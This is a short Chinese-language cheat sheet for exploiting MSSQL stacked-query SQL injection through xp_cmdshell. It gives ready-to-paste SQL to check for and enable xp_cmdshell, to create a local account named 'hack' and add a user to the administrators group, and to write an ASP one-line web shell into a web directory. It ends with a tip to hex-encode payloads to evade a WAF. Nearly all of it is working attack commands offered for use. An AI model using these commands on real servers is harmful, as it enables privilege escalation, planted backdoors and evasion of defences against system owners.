# XP_cmdshell

使用xp_cmdshell 必须是注入点存在堆叠注入
- **mssql手工注入之xp_cmdshell**

- 查看xp_cmdshell是否开启
```mssql
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'   返回正常说明开启
```

- 开启xp_cmdshell
方法：
```mssql
; EXEC  sp_configure  'show advanced options', 1; RECONFIGURE  WITH  OVERRIDE;  EXEC sp_configure  'xp_cmdshell', 1; RECONFIGURE  WITH 1 OVERRIDE;
;exec  sp_configure  'show advanced options', 1; RECONFIGURE  WITH  OVERRIDE;  EXEC sp_configure  'xp_cmdshell', 1; RECONFIGURE  WITH  OVERRIDE;
exec sp_configure 'xp_cmdshell',1;reconfigure;
```
以上三条随便用那条都可以 实在不行就三个都试一下

- 关闭xp-cmdshell
```mssql
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell', 0;reconfigure
```

----------
- 直接提权(执行cmd命令)
```
exec master..xp_cmdshell 'net user hack 123456. /add'    添加用户hack，密码123456
exec master..xp_cmdshell 'net localgroup administrators test add' 添加test用户到管理员组
```
- 如果数据的权限是dba，且知道网站路径的话，那么我们就可以用这个语句来写一句话

```mssql
;exec master..xp_cmdshell 'echo "<%@ LANGUAGE=VBSCRIPT %>;<%eval request(chr(35))%>''" > d:\KfSite\kaifeng\2.asp'
```
原理是sql server 支持堆叠查询，利用xp_cmdshell 可以执行cmd指令,cmd指令中用【echo 内容 > 文件】 可以写文件到磁盘里面
**可利用hex编码来绕过waf防火墙**
